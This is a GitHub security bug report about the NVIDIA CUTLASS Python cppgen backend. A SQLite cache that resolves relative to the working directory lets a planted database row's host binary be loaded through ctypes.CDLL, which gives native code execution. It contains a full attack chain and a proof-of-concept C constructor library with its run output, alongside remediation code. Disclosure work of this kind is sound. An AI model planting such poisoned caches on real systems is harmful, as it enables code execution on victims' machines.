# [Issue #3404] [BUG] - Native Code Execution via CWD-poisoned SQLite cache in CUTLASS `cutlass_cppgen`

source: https://github.com/NVIDIA/cutlass/issues/3404
state: open | updated: 2026-09-09T20:14:23Z
labels: bug, ? - Needs Triage, inactive-30d, CUTLASS C++

## 正文

### Which component has the problem?

CUTLASS C++

### Bug Report

## 1. Summary (TL;DR)

`cutlass_cppgen.ArtifactManager` persists compiled device (`cubin`) and host (`hostbin`) artifacts in a SQLite database whose **path is the bare, CWD-relative filename `compiled_cache.db`** (`cutlass_cppgen/__init__.py:84`). The manager is a **module-level singleton** instantiated at import (`backend/__init__.py:48: compiler = ArtifactManager()`), and its constructor does `sqlite3.connect("compiled_cache.db")` (`compiler.py:141`) — which **auto-creates the file in the process's current working directory**.

On the **default** compile path (`bypass_cache=False`, `compiler.py:358`), a cache miss calls `load_operation(key, …)` (`compiler.py:387`), which runs `SELECT * FROM compiled_operations WHERE op_key = ?` (`compiler.py:189-190`) and — for any matching row — takes the attacker-controlled `hostbin` BLOB and passes it to `CDLLBin(host_binary)` (`compiler.py:205`). `CDLLBin` writes the blob to a temp `.so` and calls **`ctypes.CDLL(...)`** on it (`compiler.py:126-132`), so the blob's ELF constructors/init code **runs inside the victim's Python process**.

An attacker who can **plant a `compiled_cache.db` in the victim's CWD** (shared filesystem, extracted archive, cloned/checked-out project, world-writable dir) with a row whose `op_key` matches an operation the victim will compile achieves **native RCE** the moment the victim compiles that op.

> This is the standard "untrusted-search-path / cache-poisoning → native library load" class. It is rated Medium (not High) because exploitation requires (a) CWD-plant capability and (b) a matching `op_key` — both stronger preconditions than the sibling [pickle.loads advisory](NVIDIA__ADVISORY_cutlass_pickle_rce.md), which needs no key match.

---

## 2. Affected component

- **Repository:** `github.com/NVIDIA/cutlass`
- **Sub-tree:** `python/cutlass_cppgen/`
- **Files involved:**
  - `python/cutlass_cppgen/__init__.py` — `CACHE_FILE = "compiled_cache.db"` (line 84) — **bare, CWD-relative**
  - `python/cutlass_cppgen/backend/__init__.py` — `compiler = ArtifactManager()` (line 48) — **singleton instantiated at import**
  - `python/cutlass_cppgen/backend/compiler.py`:
    - `ArtifactManager.__init__` (line 135) → `sqlite3.connect(CACHE_FILE)` (line 141)
    - `CDLLBin(host_binary)` (lines 126-132) — writes blob to temp `.so`, **`ctypes.CDLL`**-loads it
    - `load_operation(op_key, extra_funcs)` (lines 186-228) — `SELECT ... WHERE op_key = ?` (189-190) → `CDLLBin(host_binary)` (205)
    - `add_module(operations, compile_options=None, bypass_cache=False)` (line 358) — **cache used by default**; cache miss → `load_operation(key, …)` (387)
    - `op_key = operation.rt_module.emit() + operation.procedural_name() + self.backend` (line 382)
  - **Public entry:** `Gemm.compile()` (`python/cutlass_cppgen/op/gemm.py:478`) → `compiler.add_module([self.operation])` (`gemm.py:506`); `Conv.compile()` (`op/conv.py:637`) → `compiler.add_module([self.operation])` (`conv.py:675`). Neither passes `bypass_cache=True`, so the cache path is the default.
- **Distribution:** `cutlass_cppgen` ships in the `nvidia-cutlass` PyPI wheel and is imported by the public CUTLASS Python API.

---

## 3. Vulnerable code (exact, from HEAD `2802e22`)

### 3.1 The CWD-relative cache path — `cutlass_cppgen/__init__.py`

```python
CACHE_FILE = "compiled_cache.db"   # line 84 — bare filename; resolved relative to process CWD
```

### 3.2 Singleton at import + auto-create in CWD — `backend/__init__.py` / `compiler.py`

```python
# backend/__init__.py
compiler = ArtifactManager()        # line 48 — runs at import of cutlass_cppgen.backend

# compiler.py
class ArtifactManager:              # line 135
    def __init__(self) -> None:     # line 140
        connection = sqlite3.connect(CACHE_FILE)          # line 141 — opens/CREATES compiled_cache.db IN CWD
        cursor = connection.cursor()
        sqlite_create_table_query = """                   # line 144
        CREATE TABLE IF NOT EXISTS compiled_operations(op_key TEXT NOT NULL UNIQUE,
                                                        cubin BLOB NOT NULL,
                                                        hostbin BLOB NOT NULL,   # <-- attacker native blob
                                                        op_name TEXT NOT NULL,
                                                        op_attrs TEXT NOT NULL)
        """
        cursor.execute(sqlite_create_table_query)         # line 151
        ...
        self.nvcc()                                       # line 161 — backend defaults to "nvcc"
```

### 3.3 The sink — `CDLLBin()` (`compiler.py:126-132`)

```python
def CDLLBin(host_binary):
    tempfile.tempdir = "./"                                  # line 127 — temp .so also lands in CWD
    temp_so = tempfile.NamedTemporaryFile(prefix="host_func", suffix=".so", delete=True)  # 128
    with open(temp_so.name, "wb") as file:
        file.write(host_binary)                             # 129-130 — write attacker blob
    host_lib = ctypes.CDLL(temp_so.name)                    # line 131 — *** load + run constructors ***
    return host_lib
```

### 3.4 The poisoned-row trigger — `load_operation()` (`compiler.py:186-205`)

```python
def load_operation(self, op_key, extra_funcs):
    connection = sqlite3.connect(CACHE_FILE)                # line 187
    cursor = connection.cursor()
    sqlite_fetch_blob_query = """SELECT * from compiled_operations where op_key = ?"""   # line 189
    cursor.execute(sqlite_fetch_blob_query, (op_key,))      # line 190 — exact-key match
    record = cursor.fetchall()                              # line 191
    if len(record) == 0:
        return False                                        # line 193
    for row in record:
        key, cubin_image, host_binary, operation_name, op_attr = row   # line 195 — host_binary = attacker blob
        op_attr = json.loads(op_attr)                       # line 196
        err, module = cuda.cuModuleLoadData(cubin_image)    # line 197 — (attacker supplies a valid cubin so this succeeds on a GPU host)
        if err != cuda.CUresult.CUDA_SUCCESS:
            raise RuntimeError("Cuda Error: {}".format(err))
        err, kernel = cuda.cuModuleGetFunction(module, bytes(str.encode(operation_name)))  # line 201
        self.compiled_cache_device[key] = kernel
        compiled_host_fns = {}
        host_lib = CDLLBin(host_binary)                     # line 205 — *** native RCE ***
```

### 3.5 Default cache use on the public path — `add_module()` (`compiler.py:358-400`)

```python
def add_module(self, operations, compile_options=None, bypass_cache=False):   # line 358 — default uses cache
    ...
    for operation in operations:
        key = operation.rt_module.emit() + operation.procedural_name() + self.backend   # line 382 — op_key
        compiled_kernel = self.compiled_cache_device.get(key)               # line 384 — in-memory first
        if compiled_kernel is None and not bypass_cache:                    # line 386
            hit = self.load_operation(key, getattr(operation.rt_module, "extra_funcs", {}))  # line 387 — DB query
            if hit:
                ...                                                          # line 388-390
```

`Gemm.compile()` (`gemm.py:506`) and `Conv.compile()` (`conv.py:675`) call `compiler.add_module([self.operation])` **without `bypass_cache=True`**, so a poisoned row is consulted by default.

---

## 4. Root cause

1. **CWD-relative cache path.** `CACHE_FILE = "compiled_cache.db"` is a bare filename; SQLite auto-creates/opens it wherever the process's CWD points. There is no per-user, non-CWD resolution (`~/.cache/…`, `XDG_CACHE_HOME`) and no integrity binding.
2. **`ctypes.CDLL` on cached blobs with no verification.** `CDLLBin` writes the stored `hostbin` BLOB to a temp `.so` and `CDLL`-loads it. The BLOB is treated as trusted by virtue of being in the cache, but the cache itself is an untrusted CWD file.
3. **Singleton-at-import amplifies exposure.** Merely importing the backend (e.g. `from cutlass_cppgen.backend import compiler`) creates/opens the CWD DB, so any directory the victim `cd`s into and runs from becomes the cache location.
4. **Default cache use.** The cache is consulted on the default (`bypass_cache=False`) public compile path, so victims get no opt-out signal that loading may execute native code.

---

## 5. Attack chain (end to end)

```
attacker:
  1. compile a malicious shared object  evil.so  with a constructor/init that does anything the victim can
  2. build  compiled_cache.db  with a row:
       op_key  = rt_module.emit() + procedural_name() + backend   # pre-computable by compiling the SAME op once
       cubin   = <a VALID cubin for any kernel>                    # so cuModuleLoadData succeeds on the GPU host
       hostbin = <bytes of evil.so>                                # <-- native payload
       op_name = <any>, op_attrs = json([1])
  3. place  compiled_cache.db  in a directory the victim will `cd` into and run from
     (shared FS, extracted archive/attachment, cloned/checked-out project, world-writable /tmp)

victim:
  cd <that directory>
  python -c "
    import cutlass
    plan = cutlass.Gemm(...)        # imports cutlass_cppgen.backend -> ArtifactManager() -> opens/creates compiled_cache.db IN CWD
    plan.compile()                  # gemm.py:478 -> compiler.add_module([op]) (gemm.py:506), bypass_cache=False default
      -> key = op.rt_module.emit() + op.procedural_name() + backend          # compiler.py:382
      -> compiled_cache_device.get(key) is None                              # :384
      -> load_operation(key, ...)                                            # :387
           -> SELECT * WHERE op_key = key  -> matches attacker row           # :189-190
           -> cuModuleLoadData(attacker_cubin) succeeds (valid cubin, GPU)    # :197
           -> CDLLBin(host_binary = bytes of evil.so)                        # :205
                -> ctypes.CDLL(temp.so)                                      # :131
                     -> *** constructor executes -> native RCE in victim process ***
```

> **No GPU is needed for the *native* primitive itself** — `ctypes.CDLL` runs the constructor on the host CPU. End-to-end against the real `load_operation` does require a GPU for the `cuModuleLoadData(cubin)` line (`:197`) that precedes `CDLLBin`; the attacker satisfies it by storing a **valid cubin** in the poisoned row (the cubin's correctness is irrelevant to the RCE — it only needs to load). The PoC (§7) stubs that GPU line and exercises `CDLLBin` verbatim on attacker bytes.

---

## 6. Realistic exploitation scenario

- A developer/researcher `cd`s into an **attacker-influenced directory** and runs any CUTLASS Python compile:
  - a **cloned repo / checked-out branch** that commits a `compiled_cache.db` (e.g. a malicious PR, a typo-squatted example repo, an "example kernels" repo),
  - an **extracted archive/attachment** (a "precompiled kernels bundle" zip/tar that drops the DB),
  - a **shared filesystem / NFS / world-writable `/tmp`** where a prior user (or a different compromise) planted the DB,
  - a **poisoned CI/devcontainer working dir**.
- The victim runs `import cutlass; plan = cutlass.Gemm(...).compile()`. The singleton `ArtifactManager()` opens `compiled_cache.db` in CWD; `compile()` → `add_module` → `load_operation(key)` matches the attacker row → `CDLLBin` loads the attacker `.so` → **native code runs as the victim**.
- The `op_key` (`rt_module.emit() + procedural_name() + backend`) is **fully deterministic** for a given operation configuration. The attacker pre-computes it by compiling the same op once (on any machine with CUTLASS) and reading the key — or by targeting a common, documented example kernel. The default backend is `nvcc` (`__init__` → `self.nvcc()`, `compiler.py:161`).

---

## 7. Proof of Concept

A tested, self-contained PoC is at
[`audit-campaign/.nvidia-audit/poc/cache426/cache426_poc.py`](../.nvidia-audit/poc/cache426/cache426_poc.py) (with [`evil.c`](../.nvidia-audit/poc/cache426/evil.c) → [`evil.so`](../.nvidia-audit/poc/cache426/evil.so)).

### 7.1 What it demonstrates

The full `load_operation` path calls `cuda.cuModuleLoadData(cubin)` (`compiler.py:197`) before `CDLLBin` (`:205`), which needs a real GPU. The security-relevant sink — `CDLLBin(host_binary)` → `ctypes.CDLL` on the attacker BLOB read from the poisoned DB — is **pure Python + ctypes + sqlite3**. The PoC faithfully reproduces `CDLLBin` (`compiler.py:126-132`) and the `SELECT`→row→`CDLLBin` slice of `load_operation` (`compiler.py:186-205`) with the cubin/GPU lines stubbed (they are a precondition satisfied by a valid cubin on a GPU host, not the vulnerability). It builds a **real** malicious `.so` (a `gcc -shared -fPIC` constructor blob), plants it in a `compiled_cache.db`, and shows the constructor executes through `ctypes.CDLL`.

### 7.2 The malicious library (`evil.c`)

```c
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor)) static void _on_load(void){
    FILE* f = fopen("/tmp/pwned_by_cache426","w");
    if(f){ fprintf(f, "CACHE426 RCE: uid=%d\n", getuid()); fclose(f); }
}
```

### 7.3 Result (run on Python 3.12 + gcc, sandbox, no GPU)

```
[*] planted compiled_cache.db in CWD with attacker hostbin (15704 bytes) at op_key='VICTIM_GEMM_KEY'
[*] victim compiles an op whose key matches -> load_operation(key) ...
[*] checking for code-execution marker ...
[+] *** NATIVE RCE CONFIRMED *** CDLLBin() ctypes.CDLL'd the attacker blob from poisoned compiled_cache.db. Marker:
    CACHE426 RCE: uid=1003
```

The constructor ran inside the loader process — proving the attacker `hostbin` BLOB in the CWD-poisoned cache executes native code via `ctypes.CDLL`.

---

## 8. Impact

- **Confidentiality / Integrity / Availability: High (on trigger).** Full **native** code execution in the victim's Python process — same privilege as the victim (read secrets/keys, exfiltrate data/models, persist, destroy). Native (not Python-interpreter) execution.
- **Preconditions (why Medium, not High):**
  1. **CWD-plant capability** — the attacker must place `compiled_cache.db` in a directory the victim will run from (local/shared-FS write), **and**
  2. **matching `op_key`** — the poisoned row's key must equal the victim's compiled-op key (pre-computable, but requires the attacker to know/target the op).
- **Reachability: default public path.** `Gemm.compile()`/`Conv.compile()` use the cache by default (`bypass_cache=False`); no opt-in is required.
- **Amplifier:** the singleton-at-import + `tempfile.tempdir = "./"` (`compiler.py:127`) mean the DB *and* the temp `.so` both resolve to the victim's CWD, maximizing the chance a planted file is consulted.

---

## 9. Severity (CVSS 3.1)

`CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H` → **6.7 Medium**

- **AV:L** — local file plant in the victim's CWD.
- **AC:H** — two specific, partially out-of-attacker-control conditions must hold simultaneously: CWD-plant **and** `op_key` match. This non-trivial friction justifies AC over Low.
- **PR:L** — the attacker needs some local/shared-directory write capability to plant the file (on a fully world-writable/shared dir this approaches PR:N).
- **UI:R** — the victim must run a compile in the poisoned CWD (the documented workflow).
- **C:H/I:H/A:H** — full native process compromise.

> If the CWD is a fully unauthenticated shared/public location (PR:N), the score rises toward **7.0**; if the `op_key` match is considered low-friction (e.g. a widely-documented example kernel, AC:L), it can reach the **7.8 High** of the sibling pickle advisory. The conservative, defensible rating for *general* deployment is **Medium** because of the two preconditions; specific deployments (shared CWD + known target op) are effectively High.

---

## 10. Remediation (recommended fix)

### 10.1 (Primary) Resolve the cache under a per-user, non-CWD location

```python
# cutlass_cppgen/__init__.py
import os, pathlib
def _cache_path() -> str:
    base = os.environ.get("CUTLASS_CPPGEN_CACHE",
                          os.environ.get("XDG_CACHE_HOME",
                                         os.path.join(pathlib.Path.home(), ".cache")))
    d = pathlib.Path(base) / "cutlass_cppgen"
    d.mkdir(parents=True, exist_ok=True)
    return str(d / "compiled_cache.db")
CACHE_FILE = _cache_path()
```

This removes the CWD-poisoning vector entirely (an attacker can no longer plant the file in an arbitrary working directory).

### 10.2 (Integrity) Do not `CDLL` cached blobs without a signature

Compute an HMAC (or NVIDIA signature) over the `hostbin`/`cubin` blobs at `insert_operation` time with a key the consumer trusts, and **verify before `CDLLBin`/`cuModuleLoadData`**. Store the tag in a new column; reject on mismatch.

### 10.3 (Opt-in / least surprise) Make cache loading explicit

- Require an explicit `trust_cache=True` (or an env var) before `load_operation` will `CDLL`-load blobs, mirroring `torch.load(weights_only=…)`. Default to recompile-from-source (the safe path) when the cache is untrusted.

### 10.4 (Defense in depth) Sandbox the temp load

`CDLLBin` currently sets `tempfile.tempdir = "./"` (writes the temp `.so` to CWD) — resolve temp files under `tempfile.gettempdir()` per-user, and avoid mutating the global `tempfile.tempdir`.

**Recommended combination:** 10.1 (non-CWD path) closes the reported vector; 10.2 (integrity) defends against any residual untrusted-cache case; 10.3 removes the silent-execute surprise.

---

## Appendix B — Verified line references (HEAD `2802e22`)

| Step | File:line | Symbol |
|---|---|---|
| CWD-relative cache name | `python/cutlass_cppgen/__init__.py:84` | `CACHE_FILE = "compiled_cache.db"` |
| Singleton at import | `python/cutlass_cppgen/backend/__init__.py:48` | `compiler = ArtifactManager()` |
| Open/create DB in CWD | `python/cutlass_cppgen/backend/compiler.py:141` | `sqlite3.connect(CACHE_FILE)` |
| Cache table (has `hostbin` BLOB) | `python/cutlass_cppgen/backend/compiler.py:144-150` | `CREATE TABLE … hostbin BLOB …` |
| Default backend = nvcc | `python/cutlass_cppgen/backend/compiler.py:161` | `self.nvcc()` |
| Public compile entry (Gemm) | `python/cutlass_cppgen/op/gemm.py:478` | `Gemm.compile()` |
| → add_module call | `python/cutlass_cppgen/op/gemm.py:506` | `compiler.add_module([self.operation])` |
| Public compile entry (Conv) | `python/cutlass_cppgen/op/conv.py:637` / `:675` | `Conv.compile()` → `add_module` |
| Default cache use | `python/cutlass_cppgen/backend/compiler.py:358` | `add_module(..., bypass_cache=False)` |
| op_key computation | `python/cutlass_cppgen/backend/compiler.py:382` | `rt_module.emit() + procedural_name() + backend` |
| Cache miss → load_operation | `python/cutlass_cppgen/backend/compiler.py:386-387` | `if … not bypass_cache: load_operation(key,…)` |
| SELECT poisoned row | `python/cutlass_cppgen/backend/compiler.py:189-190` | `SELECT * … WHERE op_key = ?` |
| cubin load (needs GPU) | `python/cutlass_cppgen/backend/compiler.py:197` | `cuda.cuModuleLoadData(cubin_image)` |
| **SINK: CDLLBin on host blob** | `python/cutlass_cppgen/backend/compiler.py:205` | `host_lib = CDLLBin(host_binary)` |
| **`ctypes.CDLL` (constructors run)** | `python/cutlass_cppgen/backend/compiler.py:131` | `host_lib = ctypes.CDLL(temp_so.name)` |
| Temp `.so` in CWD | `python/cutlass_cppgen/backend/compiler.py:127` | `tempfile.tempdir = "./"` |


## 评论 (2)

### hwu36 · 2026-08-04

@jackkosaian , could you take a look?

### github-actions[bot] · 2026-09-09

This issue has been labeled `inactive-30d` due to no recent activity in the past 30 days. Please close this issue if no further response or action is needed. Otherwise, please respond with a comment indicating any updates or changes to the original issue and/or confirm this issue still needs to be addressed. This issue will be labeled `inactive-90d` if there is no activity in the next 60 days.
